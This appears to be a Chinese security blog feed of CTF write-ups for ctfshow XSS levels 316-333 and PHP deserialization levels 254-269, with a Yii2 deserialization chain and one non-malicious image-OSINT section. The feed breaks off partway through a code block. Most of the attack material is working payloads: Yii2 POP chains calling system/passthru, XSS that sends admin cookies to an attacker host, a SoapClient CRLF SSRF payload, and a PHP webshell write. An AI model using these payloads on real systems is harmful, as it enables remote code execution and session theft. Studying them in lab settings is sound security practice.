alt="image-20220226233503651"></p><h2 id="反序列化链4的复现"><a href="#反序列化链4的复现" class="headerlink" title="反序列化链4的复现"></a>反序列化链4的复现</h2><p>这条链不适用和2.0.38，是2.0.37的另一条利用链，不过还是以·BatchQueryResult·类的<code>__destruct</code>作为起点。</p><p>还是跟进到这里：<code>$this-&gt;_dataReader-&gt;close();</code>。但不是找__call作为跳板，而是寻找确实存在close方法的一个类，而且这个类的close方法可以利用。经过寻找，找到了<code>DbSession</code>这个类。</p><p><img src="/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/image-20220226234611826.png" alt="image-20220226234611826"></p><p>跟进<code>getIsActive()</code>，发现无法利用，跟进<code>composeFields()</code>：</p><p><img src="/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/image-20220226234631938.png" alt="image-20220226234631938"></p><p>发现了<code>call_user_func($this-&gt;writeCallback, $this)</code>，因为<code>$this-&gt;writeCallback</code>可控，因此调用的回调函数可控。</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpnamespace yii\rest{    class IndexAction{        public $checkAccess;        public $id;        public function __construct(){            $this-&gt;checkAccess = 'system';            $this-&gt;id = 'whoami';        }    }}namespace yii\db{    use yii\web\DbSession;    class BatchQueryResult    {        private $_dataReader;        public function __construct(){            $this-&gt;_dataReader=new DbSession();        }    }}namespace yii\web{    use yii\rest\IndexAction;    class DbSession    {        public $writeCallback;        public function __construct(){            $a=new IndexAction();            $this-&gt;writeCallback=[$a,'run'];        }    }}namespace{    use yii\db\BatchQueryResult;    echo base64_encode(serialize(new BatchQueryResult()));}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> yii2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-xss</title>
      <link href="/2022/02/19/ctfshow-xss/"/>
      <url>/2022/02/19/ctfshow-xss/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><p>在自己的vps上搞</p><p>集成环境 安装小皮面板或者宝塔面板</p><h2 id="316"><a href="#316" class="headerlink" title="316"></a>316<img src="/2022/02/19/ctfshow-xss/image-20211120200251538.png" alt="image-20211120200251538"></h2><p>payload:</p><pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;window.location.href='http://xxx/1.php?1='+document.cookie;&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="317"><a href="#317" class="headerlink" title="317"></a>317</h2><pre class="line-numbers language-none"><code class="language-none">&lt;body onload="window.location.href='http://xxx/1.php?1='+document.cookie" &gt; &lt;/body&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="318"><a href="#318" class="headerlink" title="318"></a>318</h2><pre class="line-numbers language-none"><code class="language-none">&lt;body onload="window.location.href='http://xxx/1.php?1='+document.cookie"&gt; &lt;/body&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="319"><a href="#319" class="headerlink" title="319"></a>319</h2><p>317-319  分别过滤了 script img 等  上面payload通杀</p><h2 id="320"><a href="#320" class="headerlink" title="320"></a>320</h2><p>过滤了空格</p><pre class="line-numbers language-none"><code class="language-none">&lt;body/**/onload="window.location.href='http://xxx/1.php?1='+document.cookie"&gt;&lt;/body&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="321"><a href="#321" class="headerlink" title="321"></a>321</h2><p>用‘/’ 或者‘/**/’代替空格</p><h2 id="322"><a href="#322" class="headerlink" title="322"></a>322</h2><p>继续通杀</p><h2 id="323-326"><a href="#323-326" class="headerlink" title="323-326"></a>323-326</h2><p>通杀！！！</p><h2 id="327"><a href="#327" class="headerlink" title="327"></a>327</h2><p>我们要拿到管理员的cookie 收件人要是admin </p><pre class="line-numbers language-none"><code class="language-none">&lt;body/**/onload="window.location.href='http://xxx/1.php?1='+document.cookie"&gt;&lt;/body&gt; 不行 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>返璞归真</p><pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;window.location.href='http://xss/1.php?1='+document.cookie;&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="328"><a href="#328" class="headerlink" title="328"></a>328</h2><p>要管理员才能查看用户账号密码，我们可以在注册的时候写入xss 等管理员访问的时候拿到管理员cookie</p><p>抓包伪造管理员的cookie</p><p><img src="/2022/02/19/ctfshow-xss/image-20211120214800843.png" alt="image-20211120214800843"></p><h2 id="329"><a href="#329" class="headerlink" title="329"></a>329</h2><p>cookie发送给攻击者之前就失效了，盗用cookie不行，那就直接获取管理员页面的东东</p><pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;window.open('http://xxx/1.php?1='+document.getElementsByClassName('layui-table-cell laytable-cell-1-0-1')[1].innerHTML)&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="330"><a href="#330" class="headerlink" title="330"></a>330</h2><p>发现多了一个修改密码页面，抓包 发现有api接口</p><p>让管理员本机127.0.0.1修改密码</p><pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;window.location.href='http://127.0.0.1/api/change.php?p=1234'&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后管理员登录得到flag</p><h2 id="331"><a href="#331" class="headerlink" title="331"></a>331</h2><p>post方式修改密码 发现.ajax</p><pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;$.ajax({url:'api/change.php',type:'post',data:{p:'123'}});&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="332"><a href="#332" class="headerlink" title="332"></a>332</h2><p>让收款人转账为负数，自己就无数的钱了</p><h2 id="333"><a href="#333" class="headerlink" title="333"></a>333</h2><p>非预期解：自己给自己转账 加倍增长，预测15此转即可</p><p>预期解:</p><p>先给自己转1元 抓包看参数。</p><p>然后让管理员转钱</p><pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;$.ajax({url:'api/amount.php',type:'post',data:{u:'123',a:'16116'}});&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-网络迷踪</title>
      <link href="/2022/02/11/ctfshow-wang-luo-mi-zong/"/>
      <url>/2022/02/11/ctfshow-wang-luo-mi-zong/</url>
      
        <content type="html"><![CDATA[<h3 id="工具及地址推荐"><a href="#工具及地址推荐" class="headerlink" title="工具及地址推荐"></a>工具及地址推荐</h3><p>俗话说：工欲善其事，必先利其器<br>虽然说很多大佬们都应该知道这些，但是不乏一些小白萌新们并不知道这些（比如我）<br>下面先给大家推荐一下搜图（本系列题型常用到的网站）<br>“以图搜图” （反向图片搜索引擎）是用来搜索相似图片或完全相同的图片的方法，常用来寻找现有图片的原始出处，或者低分辨率缩略图的原始大图。</p><h4 id="0x1-谷歌识图"><a href="#0x1-谷歌识图" class="headerlink" title="0x1 谷歌识图"></a>0x1 谷歌识图</h4><p>地址：<a href="https://www.google.com/imghp">https://www.google.com/imghp</a><br>推荐！谷歌图片应该是搜索效果最好的图片搜索引擎了。</p><h4 id="0x2-百度识图"><a href="#0x2-百度识图" class="headerlink" title="0x2 百度识图"></a>0x2 百度识图</h4><p>地址：<a href="https://graph.baidu.com/pcpage/index?tpl_from=pc">https://graph.baidu.com/pcpage/index?tpl_from=pc</a><br>偏向中文网站图片资源搜索。</p><h4 id="0x3-搜狗识图"><a href="#0x3-搜狗识图" class="headerlink" title="0x3 搜狗识图"></a>0x3 搜狗识图</h4><p>地址：<a href="https://pic.sogou.com/">https://pic.sogou.com</a><br>搜狗识图的功能比较人性化，分为了「通用识图」「猫狗识别」「明星识别」「找高清大图」四大类。按需选择，可以提高识别效率。</p><h4 id="0x4-Yandex-Images"><a href="#0x4-Yandex-Images" class="headerlink" title="0x4 Yandex.Images"></a>0x4 Yandex.Images</h4><p>（本次很多题就有好多是别的搜不到，在这里能搜到噢！）<br>地址：<a href="https://yandex.com/images">https://yandex.com/images</a><br>Yandex 是俄罗斯用户最多的网站，英文支持较好。效果相当给力，其它搜索引擎找不到的话用它试试，没准有惊喜哦。强烈推荐！</p><h4 id="0x5-TinEye"><a href="#0x5-TinEye" class="headerlink" title="0x5 TinEye"></a>0x5 TinEye</h4><p>地址：<a href="https://www.tineye.com/">https://www.tineye.com</a><br>老牌以图识图搜索网站，资源丰富。安装浏览器插件后可通过右键菜单直接使用。</p><h4 id="0x6-可见即可搜-必应可视化搜索"><a href="#0x6-可见即可搜-必应可视化搜索" class="headerlink" title="0x6 可见即可搜 | 必应可视化搜索"></a>0x6 可见即可搜 | 必应可视化搜索</h4><p>地址：<a href="https://www.bing.com/visualsearch?mkt=zh-CN">https://www.bing.com/visualsearch?mkt=zh-CN</a><br>由微软必应出品的视觉搜索引擎，支持植物、商品、家具、狗狗、文字、人物、建筑等特色搜索。</p><h4 id="0x7-拍立淘"><a href="#0x7-拍立淘" class="headerlink" title="0x7 拍立淘"></a>0x7 拍立淘</h4><p>地址：<a href="https://www.pailitao.com/">https://www.pailitao.com</a><br>明星同款服饰、生活百货等相似商品搜索，可直接连接淘宝展示同款商品的购买地址。</p><h4 id="0x8-WAIT-What-Anime-Is-This"><a href="#0x8-WAIT-What-Anime-Is-This" class="headerlink" title="0x8 WAIT: What Anime Is This?"></a>0x8 WAIT: What Anime Is This?</h4><p>地址：<a href="https://trace.moe/">https://trace.moe</a><br>动漫视频截图识别，找动漫必备！通过动漫视频截图，搜索所截图片的来源，获得所截图片片段位置和来源。</p><h4 id="0x9-你的狗是什么品种？"><a href="#0x9-你的狗是什么品种？" class="headerlink" title="0x9 你的狗是什么品种？"></a>0x9 你的狗是什么品种？</h4><p>地址：<a href="https://www.what-dog.net/">https://www.what-dog.net/</a><br>如名称，微软的狗狗品种识别网站。</p><h4 id="0xA-SauceNAO-Image-Search"><a href="#0xA-SauceNAO-Image-Search" class="headerlink" title="0xA SauceNAO Image Search"></a>0xA SauceNAO Image Search</h4><p>地址：<a href="https://saucenao.com/">https://saucenao.com</a><br>SauceNAO 是一个知名的图片逆向搜索引擎，尤其对于动画、漫画、插画作品、二次元图片等有着非常不错的识图搜索效果。<br>上传图片，即可获得该图片的来源以及作者主页链接。</p><h2 id="新手上路"><a href="#新手上路" class="headerlink" title="新手上路"></a>新手上路</h2><p><img src="C:/Users/86181/AppData/Roaming/Typora/typora-user-images/image-20220212153453312.png" alt="image-20220212153453312"></p><p>ctfshow{情人桥}</p><h2 id="web-初学乍练"><a href="#web-初学乍练" class="headerlink" title="web 初学乍练"></a>web 初学乍练</h2><p>谷歌识图 </p><p>发现 香港 不对 </p><p>又发现 苏黎世 对了</p><h2 id="初学又练"><a href="#初学又练" class="headerlink" title="初学又练"></a>初学又练</h2><p> 谷歌地图 <a href="https://www.google.com/maps/@55.638155,12.6387222,17z?hl=zh-cn">https://www.google.com/maps/@55.638155,12.6387222,17z?hl=zh-cn</a></p><p>搜索店名</p><p><img src="C:/Users/86181/AppData/Roaming/Typora/typora-user-images/image-20220212162244269.png" alt="image-20220212162244269"></p><h2 id="初学再练"><a href="#初学再练" class="headerlink" title="初学再练"></a>初学再练</h2><p>Yandex 搜 </p><p><img src="C:/Users/86181/AppData/Roaming/Typora/typora-user-images/image-20220212163436691.png" alt="image-20220212163436691"></p><p>那就搜世界上最北端的军事基地 </p><p>北极三叶草军事基地</p><p>不知道怎么来的 Nagurskoe</p><h2 id="现拉现吃"><a href="#现拉现吃" class="headerlink" title="现拉现吃"></a>现拉现吃</h2><p>百度搜图 发现大众点评图，</p><p><img src="C:/Users/86181/AppData/Roaming/Typora/typora-user-images/image-20220212215821562.png" alt="image-20220212215821562"></p><p>由此进入大众点评网(兰州)查看评论 价格情况</p><p>最终得到  ctfshow{yunfengniuroumian17}</p><h2 id="初窥门径"><a href="#初窥门径" class="headerlink" title="初窥门径"></a>初窥门径</h2><p>谷歌搜图 知道埃及开罗 根据提示 应该是出名的建筑</p><p>盲猜 金字塔</p><p>ctfshow{胡夫金字塔}</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络迷踪 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-反序列化</title>
      <link href="/2022/02/11/ctfshow-fan-xu-lie-hua/"/>
      <url>/2022/02/11/ctfshow-fan-xu-lie-hua/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="web-254"><a href="#web-254" class="headerlink" title="web 254"></a>web 254</h2><p><img src="/2022/02/11/ctfshow-fan-xu-lie-hua/image-20220211200642336.png" alt="image-20220211200642336"></p><h2 id="web-255"><a href="#web-255" class="headerlink" title="web 255"></a>web 255</h2><p><img src="/2022/02/11/ctfshow-fan-xu-lie-hua/image-20220211214644016.png" alt="image-20220211214644016"></p><h2 id="web-256"><a href="#web-256" class="headerlink" title="web 256"></a>web 256</h2><pre class="line-numbers language-none"><code class="language-none">if($this-&gt;username!==$this-&gt;password){                    echo "your flag is ".$flag;              }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2022/02/11/ctfshow-fan-xu-lie-hua/image-20220211214849464.png" alt="image-20220211214849464"></p><p><img src="/2022/02/11/ctfshow-fan-xu-lie-hua/image-20220211214858756.png" alt="image-20220211214858756"></p><h2 id="web-257-258"><a href="#web-257-258" class="headerlink" title="web 257-258"></a>web 257-258</h2><p> 258多了一个过滤   要求不能出现O/C:数字的形式，我们可以将序列化中的类似形式更改为O/C:+数字的形式来绕过过滤：</p><pre class="line-numbers language-none"><code class="language-none">/*增加 $this-&gt;class=new backDoor();public $code="system('tac *f');";*/&lt;?phpclass ctfShowUser{    public $class ;    public function __construct(){        $this-&gt;class=new backDoor();    }    public function login($u,$p){        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;    }    public function __destruct(){        $this-&gt;class-&gt;getInfo();    }}class info{    public $user;    public function __construct(){    }    public function getInfo(){        return $this-&gt;user;    }}class backDoor{    public $code="system('tac f*');";    public function getInfo(){echo "getshell";        eval($this-&gt;code);    }}$a = serialize(new ctfShowUser());$b = str_replace('O:11','O:+11',$a); // 对匹配的形式进行替换，在数字前增加加号$c = str_replace('O:8','O:+8',$b);echo urlencode($c);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/02/11/ctfshow-fan-xu-lie-hua/image-20220211224837338.png" alt="image-20220211224837338"></p><h2 id="web-259"><a href="#web-259" class="headerlink" title="web 259"></a>web 259</h2><p>要想得到flag，必须本地访问flag.php而且带上token=ctfshow，一看到是根据x-forwarded-for来判断的，第一反应是直接改xff头，但是这题不行,y4师傅说是因为有了cloudfare代理，我们无法通过本地构造XFF头实现绕过。因此这题需要利用原生类的反序列化来实现SSRF，考察的是php的SoapClient原生类的反序列化。</p><p>前言:如果在代码审计中有反序列化点，但在代码中找不到pop链，可以利用php内置类来进行反序列化</p><p>前置知识 CRLF[文章](<a href="https://wooyun.js.org/drops/CRLF">https://wooyun.js.org/drops/CRLF</a> Injection漏洞的利用与实例分析.html)</p><p>大佬博客 <a href="https://y4tacker.blog.csdn.net/article/details/110521104">https://y4tacker.blog.csdn.net/article/details/110521104</a> Y4tacker</p><p>最终payload:</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php$target = 'http://127.0.0.1/flag.php';$post_string = 'token=ctfshow';$headers = array(    'X-Forwarded-For: 127.0.0.1,127.0.0.1',);$b = new SoapClient(null,array('location' =&gt; $target,'user_agent'=&gt;'D4marvel^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri' =&gt; "aaab"));$aaa = serialize($b);$aaa = str_replace('^^',"\r\n",$aaa);$aaa = str_replace('&amp;','&amp;',$aaa);echo urlencode($aaa);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/02/11/ctfshow-fan-xu-lie-hua/image-20220213113033981.png" alt="image-20220213113033981"></p><h2 id="260"><a href="#260" class="headerlink" title="260"></a>260</h2><p>只要序列化后的内容有ctfshow_i_love_36D就行</p><p><img src="/2022/02/11/ctfshow-fan-xu-lie-hua/image-20220214205839303.png" alt="image-20220214205839303"></p><h2 id="261"><a href="#261" class="headerlink" title="261"></a>261</h2><p>在PHP中遇到数字与字符串进行松散比较(弱比较==)时，会将字符串中前几位是数字且数字后面不是”.”，“e”或”E”的子串转化为数字，与数字进行比较，如果相同则返回为true，不同返回为false，后面的所有字符串直接截断扔掉。<br>例子：<br>var_dump(123==‘123.5asd1234’);//输出为false<br>var_dump(123==‘123e5asd1234’);//输出为false<br>var_dump(123==‘123E5asd1234’);//输出为false<br>原因：<br>上面提到过，如果字符串数字后面是”.” , “e”, “E”，则会有其他结果。<br>“.”为浮点数的标志，会将字符串的子串转化为浮点数。<br>“e”和”E”为科学计数法的标志，将字符串的子串转化为科学计数法。</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpclass ctfshowvip{    public $username;    public $password;    public $code;    public function __construct($u,$p){        $this-&gt;username=$u;        $this-&gt;password=$p;    }    public function __wakeup(){        if($this-&gt;username!='' || $this-&gt;password!=''){            die('error');        }    }    public function __invoke(){        eval($this-&gt;code);    }    public function __unserialize($data){        $this-&gt;username=$data['username'];        $this-&gt;password=$data['password'];        $this-&gt;code = $this-&gt;username.$this-&gt;password;    }    public function __destruct(){        if($this-&gt;code==0x36d){            file_put_contents($this-&gt;username, $this-&gt;password);        }    }}  $a=new ctfshowvip('877.php','&lt;?php eval($_POST[1]);?&gt;');  echo serialize($a);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/02/11/ctfshow-fan-xu-lie-hua/image-20220214213509376.png" alt="image-20220214213509376"></p><h2 id="262"><a href="#262" class="headerlink" title="262"></a>262</h2><pre class="line-numbers language-none"><code class="language-none">&lt;?phpclass message{    public $from;    public $msg;    public $to;    public $token='user';    public function __construct($f,$m,$t){        $this-&gt;from = $f;        $this-&gt;msg = $m;        $this-&gt;to = $t;    }}  $f=1;  $m=1;  //27个fuck $t='fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}';  $msg = new message($f,$m,$t);  $umsg = str_replace('fuck', 'loveU', serialize($msg));  echo $umsg;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">payload:f=1&amp;m=1&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck%22%3Bs%3A5%3A%22token%22%3Bs%3A5%3A%22admin%22%3B%7D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/11/ctfshow-fan-xu-lie-hua/image-20220214221007628.png" alt="image-20220214221007628"></p><h2 id="263"><a href="#263" class="headerlink" title="263"></a>263</h2><p>利用点是session.serialize_handler与php.ini的配置不同引起的反序列化</p><p><img src="/2022/02/11/ctfshow-fan-xu-lie-hua/image-20220215155901066.png" alt="image-20220215155901066"></p><p>访问<code>www.zip</code>下载得到源码，观察关键代码</p><p>index.php</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phperror_reporting(0);session_start();//超过5次禁止登陆if(isset($_SESSION['limit'])){$_SESSION['limti']&gt;5?die("登陆失败次数超过限制"):$_SESSION['limit']=base64_decode($_COOKIE['limit']);$_COOKIE['limit'] = base64_encode(base64_decode($_COOKIE['limit']) +1);}else{ setcookie("limit",base64_encode('1')); $_SESSION['limit']= 1;}?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>inc.php</p><pre class="line-numbers language-none"><code class="language-none">class User{    public $username;    public $password;    public $status;    function __construct($username,$password){        $this-&gt;username = $username;        $this-&gt;password = $password;    }    function setStatus($s){        $this-&gt;status=$s;    }    function __destruct(){        file_put_contents("log-".$this-&gt;username, "使用".$this-&gt;password."登陆".($this-&gt;status?"成功":"失败")."----".date_create()-&gt;format('Y-m-d H:i:s'));    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>显然，<code>cookie</code>中的<code>limit</code>进行base64解码之后传入session中，之后调用<code>inc</code>中的<code>User</code>类，并且其中这个<code>User</code>类中存在文件写入函数，所以写入一句话即可，payload如下</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpclass User{    public $username = '1.php';    public $password = '&lt;?php system("tac flag.php");?&gt;';    public $status='dotast';}$a=new User();echo base64_encode('|'.serialize($a));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后存进cookie中，带着cookie去访问<code>index.php</code>，接着访问<code>inc/inc.php</code>，然后就会生成文件<code>log-1.php</code>，直接写一个脚本</p><pre class="line-numbers language-none"><code class="language-none">import requestsurl = "http://19e6a276-1085-42e6-8ea2-f2a520e71dac.challenge.ctf.show/"cookies = {"PHPSESSID": "qj7611bsq24qnb08a8cnfg849k", "limit": "fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7czozMToiPD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTs/PiI7czo2OiJzdGF0dXMiO3M6NjoiZG90YXN0Ijt9"}res1 = requests.get(url + "index.php", cookies=cookies)res2 = requests.get(url + "inc/inc.php", cookies=cookies)res3 = requests.get(url + "log-1.php", cookies=cookies)print(res3.text)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="264"><a href="#264" class="headerlink" title="264"></a>264</h2><p>和262差不多的反序列化字符串逃逸 </p><p>不过访问<code>message.php</code>的时候需要<code>coookie</code>中的<code>msg</code>有值，因为<code>message.php</code>有如下判断</p><pre class="line-numbers language-none"><code class="language-none">if(isset($_COOKIE['msg'])){    $msg = unserialize(base64_decode($_SESSION['msg']));    if($msg-&gt;token=='admin'){        echo $flag;    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">import requestsurl = "http://3a39bd69-62fe-402a-b1e4-143d8725b014.challenge.ctf.show/"cookies = {"PHPSESSID": "7u6jbqlm94dfubf2upuub5dfp0", "msg":"123"}get_url=url+"?f=123&amp;m=123&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck%22%3Bs%3A5%3A%22token%22%3Bs%3A5%3A%22admin%22%3B%7D"res1 = requests.get(url=get_url)res2 = requests.get(url + "message.php", cookies=cookies)print(res2.text)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/02/11/ctfshow-fan-xu-lie-hua/image-20220217140028372.png" alt="image-20220217140028372"></p><h2 id="265"><a href="#265" class="headerlink" title="265"></a>265</h2><p>看了一下代码逻辑，很显然，<code>$ctfshow</code>接收传进来的反序列化内容，然后把类中的token赋值为随机数。然后调用<code>login</code>方法，只有<code>token===password</code>才会输出flag；而我们怎么才能定义<code>password</code>的内容等于我们未知的随机数呢？我们可以采用php变量引用的方式</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php$a =&amp;$b;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>注意：$a和$b是指向同一个地方，而不是$a指向了$b，亦或$b指向$a</p><p>payload:</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpclass ctfshowAdmin{    public $token = "dotast";    public $password = "dotast";    public function login(){        return $this-&gt;token===$this-&gt;password;    }}$a = new ctfshowAdmin();$a -&gt;token=&amp;$a -&gt;password;echo urlencode(serialize($a));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="266"><a href="#266" class="headerlink" title="266"></a>266</h2><p>直接大小写绕过  </p><p><img src="/2022/02/11/ctfshow-fan-xu-lie-hua/image-20220217201248901.png" alt="image-20220217201248901"></p><h2 id="267"><a href="#267" class="headerlink" title="267"></a>267</h2><p><a href="https://blog.csdn.net/qq_46918279/article/details/120473172">https://blog.csdn.net/qq_46918279/article/details/120473172</a>  CVE-2020-15148–Yii2 反序列化漏洞复现</p><p><a href="https://blog.csdn.net/rfrder/article/details/113824239">https://blog.csdn.net/rfrder/article/details/113824239</a> bfengj</p><p><a href="https://blog.csdn.net/Zero_Adam/article/details/118031709">https://blog.csdn.net/Zero_Adam/article/details/118031709</a></p><p>弱密码 admin admin登录成功后，在about页面发现提示?view-source<br>访问url/?r=site/about&amp;view-source得到反序列化点<br>payload ?r=backdoor/shell&amp;code=poc</p><p>poc.php</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpnamespace yii\rest{    class CreateAction{        public $checkAccess;        public $id;        public function __construct(){            $this-&gt;checkAccess = 'passthru';            $this-&gt;id = 'cat /flag';        }    }}namespace Faker{    use yii\rest\CreateAction;    class Generator{        protected $formatters;        public function __construct(){            $this-&gt;formatters['close'] = [new CreateAction(), 'run'];        }    }}namespace yii\db{    use Faker\Generator;    class BatchQueryResult{        private $_dataReader;        public function __construct(){            $this-&gt;_dataReader = new Generator;        }    }}namespace{    echo base64_encode(serialize(new yii\db\BatchQueryResult));}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/02/11/ctfshow-fan-xu-lie-hua/image-20220218230105536.png" alt="image-20220218230105536"></p><h2 id="268"><a href="#268" class="headerlink" title="268"></a>268</h2><p>2.38</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpnamespace Faker{    use yii\rest\IndexAction;    class Generator    {        protected $formatters;        public function __construct()        {            #__call方法传进来是 名称 也就是 isRunning。            $this-&gt;formatters['isRunning'] = [new IndexAction(),'run'];        }    }}namespace yii\rest{    class IndexAction    {        public $checkAccess;        public $id;        public function __construct()        {            $this-&gt;checkAccess="passthru";            $this-&gt;id="cat /flags";        }    }}namespace Codeception\Extension {    use Faker\Generator;    class RunProcess    {        private $processes = [];        public function __construct()        {            $this-&gt;processes[] = new Generator();        }    }}namespace{    use Codeception\Extension\RunProcess;    echo base64_encode(serialize(new RunProcess()));}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="269"><a href="#269" class="headerlink" title="269"></a>269</h2><pre class="line-numbers language-none"><code class="language-none">&lt;?phpnamespace Faker{    use yii\rest\IndexAction;    class Generator    {        protected $formatters;        public function __construct()        {            #__call方法传进来是 名称 也就是 isRunning。            $this-&gt;formatters['render'] = [new IndexAction(),'run'];        }    }}namespace yii\rest{    class IndexAction    {        public $checkAccess;        public $id;        public function __construct()        {            $this-&gt;checkAccess="passthru";            $this-&gt;id="cat /flagsa";        }    }}namespace phpDocumentor\Reflection\DocBlock\Tags{    use Faker\Generator;    class See    {        protected $description;        public function __construct()        {            $this-&gt;description = new Generator();        }    }}namespace{    use phpDocumentor\Reflection\DocBlock\Tags\See;    class Swift_KeyCache_DiskKeyCache    {        private $keys = [];        private $path;     